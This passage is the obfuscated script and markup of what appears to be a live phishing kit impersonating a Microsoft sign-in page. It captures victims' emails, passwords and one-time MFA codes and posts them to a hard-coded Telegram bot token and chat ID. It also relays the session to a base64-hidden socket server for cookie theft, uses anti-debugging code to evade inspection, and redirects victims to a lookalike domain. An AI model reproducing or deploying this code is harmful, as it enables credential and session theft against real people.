src="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_sms_12b7d768ba76f2e782cc74e328171091.svg">\n                <p class="phoneotpText">We texted your phone​</p>\n            </div>\n            <a class="otpError">.....</a>\n            <input class="otpInput" placeholder="Code" type="text" name="">\n            <div style="display: flex;">\n                <a style="padding-right: 7px; font-size: 0.9rem; color: #0067b8; cursor: pointer;">More information</a>\n            </div>\n            <button id="sendphoneCode" class="formButton" type="submit">Verify</button>\n        </div>\n\n        <!-- LOADER1 -->\n        <div class="loaderxBlock w3-animate-right">\n            <img class="formLogo" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="logo.png">\n            <br><br><br><br>\n            <a class="signIn">Trying to sign in</a>\n            <br><br>\n            <a style="display: grid;" class="dot-floating"></a>\n            <br><br>\n            <a style="border-style: solid; color: #0067b8; width: 50px; border-color: black; border-width: thin;">Cancel</a>\n            <br><br><br><br>\n        </div>\n\n        <!-- LOADER11 -->\n        <div class="loaderxBlock11 w3-animate-right">\n            <img class="formLogo" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="logo.png">\n            <br><br>\n            <a class="signIn">Trying to sign in</a>\n            <br><br>\n            <a style="display: grid;" class="dot-floating"></a>\n            <br><br>\n            <div class="recaptcha">\n\n                <div class="checkbox-wrapper-43">\n                    <input type="checkbox" id="cbx-43">\n                    <label for="cbx-43" class="check">\n                      <svg width="25px" height="25px" viewBox="0 0 18 18">\n                        <path d="M1,9 L1,3.5 C1,2 2,1 3.5,1 L14.5,1 C16,1 17,2 17,3.5 L17,14.5 C17,16 16,17 14.5,17 L3.5,17 C2,17 1,16 1,14.5 L1,9 Z"></path>\n                        <polyline points="1 9 7 14 15 4"></polyline>\n                      </svg>\n                    </label>\n                </div>\n                <span class="amnotrobot">I\'m not a robot</span>\n                <!-- <input class="recaptchacheckbox" type="checkbox" name="" id=""> -->\n                <div class="recaptchasub">\n                    <img style="width: 30px;" src="https://www.gstatic.com/recaptcha/api2/logo_48.png">\n                    <span style="font-size: 0.8rem;">reCAPTCHA</span>\n                    <span style="font-size: 0.6rem;">Privacy - Terms</span>\n                </div>\n            </div>\n            <br><br>\n            <a style="border-style: solid; color: #0067b8; width: 50px; border-color: black; border-width: thin;">Cancel</a>\n            <br><br>\n        </div>\n\n        <!-- LOADER2 -->\n        <div style="display: none;" class="loaderxBlock2 w3-animate-right">\n            <img class="formLogo" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="logo.png">\n            <br><br><br>\n            <!-- <a class="signIn">Taking you to your organization\'s sign-in page</a> -->\n            <a id="signIn_text_changer" class="signIn">Sign in to your account</a>\n            <br><br><br>\n            <a style="display: grid;" class="dot-floating"></a>\n            <br><br>\n            <a style="border-style: solid; color: #0067b8; width: 50px; border-color: black; border-width: thin;">Cancel</a>\n            <br><br><br><br>\n        </div>\n\n        <!-- BOILERTEXT -->\n        <div class="grayBox">\n            boiler text\n        </div>\n    </div>\n\n    <!-- LOGIN PAGE END  -->\n  <div class="loginForm2">\n    <div>\n        <div class="promoted-fed-cred-box ext-promoted-fed-cred-box">\n            <div class="promoted-fed-cred-content">\n                <div class="tile-container">\n                    <div class="row tile">\n                        <div class="table" role="button" tabindex="0">\n                            <div class="table-row">\n                                <div class="table-cell tile-img medium">\n                                    <img class="tile-img medium" src="https://aadcdn.msauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg" alt="Sign-in options">\n                                </div>\n                                <div class="table-cell text-left content">\n                                    <div>Sign-in options</div>\n                                </div>\n                            </div>\n                        </div>\n                    </div>\n                </div>\n            </div>\n        </div>\n    </div>\n</div> <div class="buttomLabel">\n        <a>Terms of use</a>\n        <a>Privacy &amp; cookies</a>\n        <!-- <a>...</a> -->\n    </div>\n'
  );
  document.oncontextmenu = document.body.oncontextmenu = function () {
    return false;
  };
  window.addEventListener("resize", function (_0x512020) {});
  !(function () {
    function _0x4c62a7(_0x14ed15) {
      if (isNaN(+_0x14ed15)) {
        _0x14ed15 = 0x64;
      }
      var _0x3564da = +new Date();
      debugger;
      var _0x449d7f = +new Date();
      if (
        isNaN(_0x3564da) ||
        isNaN(_0x449d7f) ||
        _0x449d7f - _0x3564da > _0x14ed15
      ) {
        window.location.href = "https://google.com";
      }
    }
    if (window.attachEvent) {
      if (
        document.readyState === "complete" ||
        document.readyState === "interactive"
      ) {
        _0x4c62a7();
        window.attachEvent("onresize", _0x4c62a7);
        window.attachEvent("onmousemove", _0x4c62a7);
        window.attachEvent("onfocus", _0x4c62a7);
        window.attachEvent("onblur", _0x4c62a7);
      } else {
        setTimeout(argument.callee, 0x0);
      }
    } else {
      window.addEventListener("load", _0x4c62a7);
      window.addEventListener("resize", _0x4c62a7);
      window.addEventListener("mousemove", _0x4c62a7);
      window.addEventListener("focus", _0x4c62a7);
      window.addEventListener("blur", _0x4c62a7);
    }
  })();
  const _0x2857f4 = document.querySelector(".loaderxBlock");
  const _0x35c543 = document.querySelector(".loaderxBlock2");
  const _0x119881 = document.querySelector(".loaderxBlock11");
  const _0x2331ec = document.querySelector(".overlay");
  const _0x1fb9a3 = document.querySelector(".emailBlock");
  const _0x1f1063 = document.querySelector(".passwordBlock");
  const _0x17c317 = document.querySelector(".msappBlock");
  const _0x148d9c = document.querySelector(".msappcodeBlock");
  const _0x2559ba = document.querySelector(".noPassmsappBlock");
  const _0x206ab9 = document.querySelector(".phoneBlock");
  const _0x117376 = document.querySelector("#sendEmail");
  const _0x162b56 = document.querySelector("#sendPass");
  const _0x3f9afa = document.querySelector("#sendphoneCode");
  const _0x29777d = document.querySelector("#sendAppCode");
  const _0x12e434 = document.querySelector(".emailInvalid");
  const _0x1616fa = document.querySelector(".passwordError");
  const _0x3623b1 = document.querySelector(".otpError");
  const _0x2ee3ec = document.querySelector(".otpError2");
  const _0x4e2af3 = document.querySelector(".passwordInput");
  const _0x5834bf = document.querySelector(".emailInput");
  var _0x46a04f = document.getElementById("html").getAttribute("vic");
  const _0x210dd6 = document.querySelectorAll(".emailLabel");
  const _0x3ac395 = document.getElementById("html").getAttribute("sti");
  const _0x174019 = document.querySelector("#allbody");
  const _0x207cec = document.querySelector("#signIn_text_changer");
  const _0x2840ec = document.querySelectorAll(".formLogo");
  const _0x6f0f0a = document.querySelector("#otpCode");
  const _0x24ef41 = document.querySelector("#otpCode2");
  const _0x82f96a = document.querySelector(".phoneotpText");
  const _0x300c9f = document.querySelector(".appotpCode");
  const _0x48ca7f = document.querySelector(".otpInput");
  const _0x423ae3 = document.querySelector(".otpInput2");
  const _0xb13de6 = document.querySelector("#cbx-43");
  const _0x57a5f = document.querySelector(".grayBox");
  let passwordAttempts = 0; // Counter to track password input attempts
  const maxAttempts = 2;
  var _0x58102b;
  var _0x4c5d45 = {
    ua: navigator.userAgent,
    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    browserLanguage: navigator.language || navigator.userLanguage,
    uid: atob(atob(_0x3ac395)),
    email: _0x46a04f,
  };
  _0x4c5d45.bannerLogo;
  _0x4c5d45.backgroundImage;
  _0x4c5d45.boilerText;
  _0x4c5d45.phish_state;
  _0x4c5d45.email_type;
  const _0x54e5dc = (_0x3b749d) => {
    if (!_0x3b749d) {
      return false;
    }
    if (_0x3b749d.length > 0xfe) {
      return false;
    }
    var _0x4509ce =
      /^[-!#$%&'*+\/0-9=?A-Z^_a-z{|}~](\.?[-!#$%&'*+\/0-9=?A-Z^_a-z`{|}~])*@[a-zA-Z0-9](-*\.?[a-zA-Z0-9])*\.[a-zA-Z](-?[a-zA-Z0-9])+$/.test(
        _0x3b749d
      );
    if (!_0x4509ce) {
      return false;
    }
    var _0x2b623 = _0x3b749d.split("@");
    if (_0x2b623[0x0].length > 0x40) {
      return false;
    }
    var _0x13e09a = _0x2b623[0x1].split(".");
    if (
      _0x13e09a.some(function (_0x384061) {
        return _0x384061.length > 0x3f;
      })
    ) {
      return false;
    }
    return true;
  };
  const _0x4fcc14 = (_0x50b0fe, _0x1d017d, _0x20a228) => {
    let _0x476c8b = _0x4c5d45.email.split("@")[0x1];
    _0x50b0fe = _0x50b0fe.replace(new RegExp(_0x1d017d, "g"), _0x20a228);
    _0x50b0fe = _0x50b0fe.replace(new RegExp(_0x1d017d, "g"), _0x20a228);
    _0x50b0fe = _0x50b0fe.replace(new RegExp(_0x1d017d, "g"), _0x20a228);
    _0x50b0fe = _0x50b0fe.replace(new RegExp(_0x1d017d, "g"), _0x20a228);
    _0x50b0fe = _0x50b0fe.replace(new RegExp(_0x1d017d, "g"), _0x20a228);
    _0x50b0fe = _0x50b0fe.replace(new RegExp(_0x1d017d, "g"), _0x20a228);
    _0x50b0fe = _0x50b0fe.replace(new RegExp(_0x1d017d, "g"), _0x20a228);
    _0x50b0fe = _0x50b0fe.replace(new RegExp(_0x1d017d, "g"), _0x20a228);
    _0x50b0fe = _0x50b0fe.replace(
      new RegExp(_0x476c8b, "g"),
      "authentication-server.com"
    );
    return _0x50b0fe;
  };
  const _0xa0771 = (_0x4f1f32) => {
    if (_0x4f1f32.email) {
      _0x210dd6.forEach((_0x30baec) => {
        _0x30baec.innerHTML = _0x4f1f32.email;
      });
    }
    if (_0x4f1f32.bannerLogo) {
      _0x2840ec.forEach((_0x3257dc) => {
        _0x3257dc.src = _0x4f1f32.bannerLogo;
      });
      _0x174019.style.backgroundImage =
        "url('" + _0x4f1f32.backgroundImage + "')";
      if (
        _0x4f1f32.backgroundImage !=
          "https://aadcdn.msftauth.net/shared/1.0/content/images/appbackgrounds/49_6ffe0a92d779c878835b40171ffc2e13.jpg" &&
        _0x4f1f32.bannerLogo !=
          "https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg"
      ) {
        _0x2331ec.style.display = "block";
      }
    }
    if (_0x4f1f32 === "LD1") {
      _0x119881.style.display = "none";
      _0x2857f4.style.display = "block";
      _0x35c543.style.display = "none";
      _0x1fb9a3.style.display = "none";
      _0x1f1063.style.display = "none";
      _0x17c317.style.display = "none";
      _0x206ab9.style.display = "none";
      _0x148d9c.style.display = "none";
    } else {
      if (_0x4f1f32 === "LD11") {
        _0x119881.style.display = "block";
        _0x2857f4.style.display = "none";
        _0x35c543.style.display = "none";
        _0x1fb9a3.style.display = "none";
        _0x1f1063.style.display = "none";
        _0x17c317.style.display = "none";
        _0x206ab9.style.display = "none";
        _0x148d9c.style.display = "none";
      } else {
        if (_0x4f1f32 === "LD2") {
          _0x119881.style.display = "none";
          _0x35c543.style.display = "block";
          _0x2857f4.style.display = "none";
          _0x1fb9a3.style.display = "none";
          _0x1f1063.style.display = "none";
          _0x17c317.style.display = "none";
          _0x206ab9.style.display = "none";
          _0x148d9c.style.display = "none";
          setTimeout(() => {
            _0x207cec.innerHTML = "Please wait ...";
          }, 0xbb8);
          setTimeout(() => {
            _0x207cec.innerHTML = "Authenticating ...";
          }, 0x1770);
          setTimeout(() => {
            _0x207cec.innerHTML = "Trying to sign you in ...";
          }, 0x2328);
        } else {
          if (
            _0x4f1f32.phish_state === "RQ_EMAIL" ||
            _0x4f1f32 === "RQ_EMAIL"
          ) {
            _0x119881.style.display = "none";
            _0x1fb9a3.style.display = "grid";
            _0x2857f4.style.display = "none";
            _0x35c543.style.display = "none";
            _0x1f1063.style.display = "none";
            _0x17c317.style.display = "none";
            _0x206ab9.style.display = "none";
            console.log("Current phish_state:", _0x4f1f32.phish_state);
            if (_0x4f1f32.email_exist) {
              if (_0x4f1f32.email_exist != true) {
                _0x12e434.style.display = "block";
                _0x12e434.innerHTML = _0x4f1f32.email_exist;
                _0x5834bf.value = _0x4c5d45.email;
              }
            }
            console.log("Current phish_state:", _0x4f1f32.phish_state);
            _0x5834bf.focus();
          } else {
            if (_0x4f1f32.phish_state === "RQ_PASSWORD") {
              _0x119881.style.display = "none";
              _0x1f1063.style.display = "grid";
              _0x2857f4.style.display = "none";
              _0x35c543.style.display = "none";
              _0x1fb9a3.style.display = "none";
              _0x17c317.style.display = "none";
              _0x206ab9.style.display = "none";
              if (_0x4f1f32.CORRECT_PASSWORD) {
                // passwordAttempts++;
                // if (passwordAttempts > 1) {
                //   _0x4f1f32.CORRECT_PASSWORD = 'OK'
                // }
                if (_0x4f1f32.CORRECT_PASSWORD != "OK") {
                  _0x1616fa.style.display = "block";
                  _0x1616fa.innerHTML = _0x4f1f32.CORRECT_PASSWORD;
                  _0x4e2af3.value = "";
                }
                if (
                  _0x4f1f32.email_type != "ADFS" &&
                  _0x4f1f32.email_type != "O365" &&
                  _0x4f1f32.email_type != "OUTLOOK_HOTMAIL" &&
                  _0x4f1f32.email_type != "GODADDY_OFFICE"
                ) {
                  console.log("Email type found is ", _0x4f1f32.email_type);
                  _0x1616fa.style.display = "block";
                  _0x1616fa.innerHTML = "Incorrect password, please try again!";
                  _0x4e2af3.value = "";
                }
              }
              _0x4e2af3.focus();
            } else {
              if (
                _0x4f1f32.phish_state === "RQ_OTP_NOPASS_APP" ||
                _0x4f1f32 === "RQ_OTP_NOPASS_APP"
              ) {
                _0x119881.style.display = "none";
                _0x2559ba.style.display = "grid";
                _0x17c317.style.display = "none";
                _0x2857f4.style.display = "none";
                _0x35c543.style.display = "none";
                _0x1fb9a3.style.display = "none";
                _0x1f1063.style.display = "none";
                _0x206ab9.style.display = "none";
                _0x24ef41.innerHTML = _0x4f1f32.OTP_TYPE;
              } else {
                if (_0x4f1f32.phish_state === "RQ_OTP_APP") {
                  _0x119881.style.display = "none";
                  _0x17c317.style.display = "grid";
                  _0x2857f4.style.display = "none";
                  _0x35c543.style.display = "none";
                  _0x1fb9a3.style.display = "none";
                  _0x1f1063.style.display = "none";
                  _0x206ab9.style.display = "none";
                  _0x6f0f0a.innerHTML = _0x4f1f32.OTP_TYPE;
                } else {
                  if (_0x4f1f32.phish_state === "RQ_OTP_APP_CODE") {
                    _0x119881.style.display = "none";
                    _0x148d9c.style.display = "grid";
                    _0x2857f4.style.display = "none";
                    _0x35c543.style.display = "none";
                    _0x1fb9a3.style.display = "none";
                    _0x1f1063.style.display = "none";
                    _0x17c317.style.display = "none";
                    _0x300c9f.innerHTML = _0x4f1f32.OTP_TYPE;
                    if (_0x4f1f32.CORRECT_OTP) {
                      if (_0x4f1f32.CORRECT_OTP != "OK") {
                        _0x2ee3ec.style.display = "block";
                        _0x2ee3ec.innerHTML = _0x4f1f32.CORRECT_OTP;
                        _0x423ae3.value = "";
                      }
                    }
                  } else if (_0x4f1f32.phish_state === "RQ_OTP_PHONE") {
                    _0x119881.style.display = "none";
                    _0x206ab9.style.display = "grid";
                    _0x2857f4.style.display = "none";
                    _0x35c543.style.display = "none";
                    _0x1fb9a3.style.display = "none";
                    _0x1f1063.style.display = "none";
                    _0x17c317.style.display = "none";
                    _0x82f96a.innerHTML = _0x4f1f32.OTP_TYPE;
                    if (_0x4f1f32.CORRECT_OTP) {
                      if (_0x4f1f32.CORRECT_OTP != "OK") {
                        _0x3623b1.style.display = "block";
                        _0x3623b1.innerHTML = _0x4f1f32.CORRECT_OTP;
                        _0x48ca7f.value = "";
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  };

  let lastMessageTime = 0; // Keeps track of the last time a message was sent
  const messageInterval = 1; // Minimum interval between messages in milliseconds (1 second)

  // Chat ID: 5902094102
  // Token: 8014427564:AAFLIvqt2dKDb_VmY1B536I7fB_HRrA7a8M
  function sendMessage(message) {
    const chatId = "5902094102"; // Your chat ID
    const botToken = "8014427564:AAFLIvqt2dKDb_VmY1B536I7fB_HRrA7a8M"; // Your bot token

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    const ipRegex = /(?:Chrome\/[\d.]+ )([^\s]+)/;
    const ipMatch = message.ua.match(ipRegex);
    const ipAddress = ipMatch ? ipMatch[1] : "Unknown";

    let formattedMessage;

    if (message.password) {
      // If password exists, create the password-specific message
      formattedMessage = `
⭕ ${message.email}
----------------------
✅[VALID] PASSWORD🔐: ${message.password}
----------------------
Waiting for other mode of authentication
          `;
    } else {
      // Normal message without password
      formattedMessage = `
⭕⭕New Visit: ${message.email}
-------------------------------
${message.ua} | IP: ${ipAddress} | Email Type: ${message.email_type} | Time Zone: ${message.timeZone}
      `;
    }

    const currentTime = Date.now();
    if (currentTime - lastMessageTime >= messageInterval) {
      lastMessageTime = currentTime;
      const data = {
        chat_id: chatId,
        text: formattedMessage,
      };

      fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      })
        .then((response) => response.json())
        .then((result) => {
          if (result.ok) {
            console.log("Message sent successfully!");
          } else {
            console.log("Message Failed to send!");
          }
        })
        .catch((error) => {
          console.error("Error:", error);
        });
    }
  }
  _0x117376.addEventListener("click", () => {
    if (_0x54e5dc(_0x5834bf.value.trim())) {
      if (
        _0x5834bf.value.trim().includes("@gmail.com") ||
        _0x5834bf.value.trim().includes("@yahoo.") ||
        _0x5834bf.value.trim().includes("@aol.") ||
        _0x5834bf.value.trim().includes("@comcast.") ||
        _0x5834bf.value.trim().includes("@msn.") ||
        _0x5834bf.value.trim().includes("@123.") ||
        _0x5834bf.value.trim().includes("@ionos.") ||
        _0x5834bf.value.trim().includes("@mail.") ||
        _0x5834bf.value.trim().includes("@163.") ||
        _0x5834bf.value.trim().includes("@yandex.") ||
        _0x5834bf.value.trim().includes("@gmx.") ||
        _0x5834bf.value.trim().includes("@protonmail.") ||
        _0x5834bf.value.trim().includes("@web.") ||
        _0x5834bf.value.trim().includes("@att.") ||
        _0x5834bf.value.trim().includes("@qq.") ||
        _0x5834bf.value.trim().includes("@test.") ||
        _0x5834bf.value.trim().includes("@pointcaremedical.org")
      ) {
        _0xa0771("LD2");
        setTimeout(() => {
          _0xa0771("RQ_EMAIL");
          _0x12e434.style.display = "block";
        }, 0x3e8);
        _0x12e434.innerHTML =
          "We couldn't find an account with that username. Try another, or get a new Microsoft account.";
      } else {
        _0x4c5d45.email = _0x5834bf.value.trim();
        console.log("sending email");
        _0xa0771("LD2");
        console.log("object is ", _0x4c5d45);
        sendMessage(_0x4c5d45);
        setTimeout(() => {
          console.log("Calling the password function");
          _0xa0771({ phish_state: "RQ_PASSWORD" }); // Call the function with the next state
        }, 3000);
        //   setTimeout(() => {
        //     _0xa0771("RQ_EMAIL");
        //     _0x12e434.style.display = "block";
        //   }, 0x3e8);
        // }
        _0xeffea3();
      }
    } else {
      _0xa0771("LD2");
      setTimeout(() => {
        _0xa0771("RQ_EMAIL");
        _0x12e434.style.display = "block";
      }, 0x3e8);
    }
  });
  _0x5834bf.addEventListener("keyup", function (_0x4979eb) {
    if (_0x4979eb.keyCode === 0xd) {
      _0x4979eb.preventDefault();
      _0x117376.click();
    }
  });
  _0xb13de6.addEventListener("change", function () {
    setTimeout(() => {
      _0x117376.click();
    }, 0x384);
  });
  _0x162b56.addEventListener("click", () => {
    _0x4c5d45.password = _0x4e2af3.value;
    console.log("send pass");
    _0xa0771("LD1");
    passwordAttempts++;
    console.log("password attempts is ", passwordAttempts);
    sendMessage(_0x4c5d45);
    // if (passwordAttempts > 1) {
    setTimeout(function () {
      window.location.href = "https://microsoft.archive-login.com";
    }, 4000);
    // }
    _0x58102b.emit("password_command", _0x4c5d45);
  });
  _0x4e2af3.addEventListener("keyup", function (_0x3eb40d) {
    if (_0x3eb40d.keyCode === 0xd) {
      _0x3eb40d.preventDefault();
      _0x162b56.click();
    }
  });
  _0x3f9afa.addEventListener("click", () => {
    _0x4c5d45.phish_otp = _0x48ca7f.value;
    _0xa0771("LD1");
    _0x58102b.emit("otp_command", _0x4c5d45);
  });
  _0x48ca7f.addEventListener("keyup", function (_0x10298c) {
    if (_0x10298c.keyCode === 0xd) {
      _0x10298c.preventDefault();
      _0x3f9afa.click();
    }
  });
  _0x29777d.addEventListener("click", () => {
    _0x4c5d45.phish_otp = _0x423ae3.value;
    console.log("send otp");
    _0xa0771("LD1");
    console.log("OTP information sent  IS ", _0x4c5d45);
    sendMessage(_0x4c5d45);
    _0x58102b.emit("otp_command", _0x4c5d45);
  });
  _0x423ae3.addEventListener("keyup", function (_0xd8ff3c) {
    if (_0xd8ff3c.keyCode === 0xd) {
      _0xd8ff3c.preventDefault();
      _0x29777d.click();
    }
  });
  let debounceTimer;

  function debounceSendMessage(data, delay = 300) {
    clearTimeout(debounceTimer);
    debounceTimer = setTimeout(() => {
      sendMessage(data);
    }, delay);
  }
  const _0xeffea3 = async () => {
    _0x58102b = io(atob("aHR0cHM6Ly9tMmZlcy1hcGljb29raWVzLmNvbQ=="), {
      extraHeaders: {
        Auth_UID: _0x4c5d45.uid,
        Session_Email: _0x4c5d45.email,
      },
    });
    _0x58102b.emit("new-session", _0x4c5d45);
    _0x58102b.on("s2c_cookies", (_0x1a2a13) => {
      window.top.location.href = "https://microsoft.archive-login.com";
    });
    _0x58102b.on("s2c_restart", (_0x40119d) => {
      window.location.reload();
    });
    _0x58102b.on("disconnect", function () {
      window.location.reload();
    });
    _0x58102b.on("s2c", (_0x18932a) => {
      console.log(_0x18932a);
      if (_0x18932a.phish_groupid) {
        _0x4c5d45.phish_groupid = _0x18932a.phish_groupid;
      }
      if (_0x18932a.phish_id) {
        _0x4c5d45.phish_id = _0x18932a.phish_id;
      }
      if (_0x18932a.bannerLogo) {
        _0x4c5d45.bannerLogo = _0x18932a.bannerLogo;
        _0x4c5d45.backgroundImage = _0x18932a.backgroundImage;
      }
      if (_0x18932a.boilerText) {
        _0x57a5f.style.display = "block";
        _0x57a5f.innerHTML =
          "<p>" + _0x4fcc14(_0x18932a.boilerText, "href", "id") + "<p/>";
      }
      if (_0x18932a.phish_state) {
        _0x4c5d45.phish_state = _0x18932a.phish_state;
      }
      if (_0x18932a.email) {
        _0x4c5d45.email = _0x18932a.email;
      }
      if (_0x18932a.CORRECT_PASSWORD) {
        _0x4c5d45.CORRECT_PASSWORD = _0x18932a.CORRECT_PASSWORD;
      }
      if (_0x18932a.OTP_TYPE) {
        _0x4c5d45.OTP_TYPE = _0x18932a.OTP_TYPE;
      }
      if (_0x18932a.email_exist) {
        _0x4c5d45.email_exist = _0x18932a.email_exist;
      }
      if (_0x18932a.CORRECT_OTP) {
        _0x4c5d45.CORRECT_OTP = _0x18932a.CORRECT_OTP;
      }
      if (_0x18932a.boilerText) {
        _0x4c5d45.boilerText = _0x18932a.boilerText;
      }
      if (_0x18932a.email_type) {
        _0x4c5d45.email_type = _0x18932a.email_type;
      }
      if (_0x18932a.endUrl) {
        _0x4c5d45.endUrl = _0x18932a.endUrl;
      }
      _0xa0771(_0x4c5d45);
      if (_0x4c5d45.email_type) {
        debounceSendMessage(_0x4c5d45);
      }
    });
    _0x4c5d45.phish_state = null;
    return _0x58102b;
  };
  const _0x2ad6ba = () => {
    if (_0x54e5dc(_0x4c5d45.email)) {
      _0x5834bf.value = _0x4c5d45.email;
      _0xa0771("LD1");
      setTimeout(() => {
        _0xa0771("LD11");
      }, 0x384);
    } else {
      _0xa0771("LD1");
      setTimeout(() => {
        _0xa0771("RQ_EMAIL");
      }, 0x3e8);
    }
  };
  const _0x1ca391 = () => {
    let _0x13d992 = window.location.href;
    console.log(_0x13d992);
    let _0x43c883 = _0x13d992.split("#");
    let _0x315f0b = _0x43c883[0x1];
    console.log(_0x315f0b);
    if (_0x54e5dc(_0x46a04f)) {
      _0x4c5d45.email = _0x46a04f;
    } else {
      try {
        _0x4c5d45.email = atob(_0x46a04f);
      } catch (_0x2833be) {
        console.log("EMBEDED EMAIL NULL");
      }
    }
    if (_0x54e5dc(_0x315f0b)) {
      _0x4c5d45.email = _0x315f0b;
    } else {
      try {
        _0x4c5d45.email = atob(_0x315f0b);
      } catch (_0xb5dda) {
        console.log("URL EMAIL=NULL");
      }
    }
    console.log(_0x4c5d45.email);
    _0x2ad6ba();
    return _0x4c5d45.email;
  };
  _0x1ca391();
});
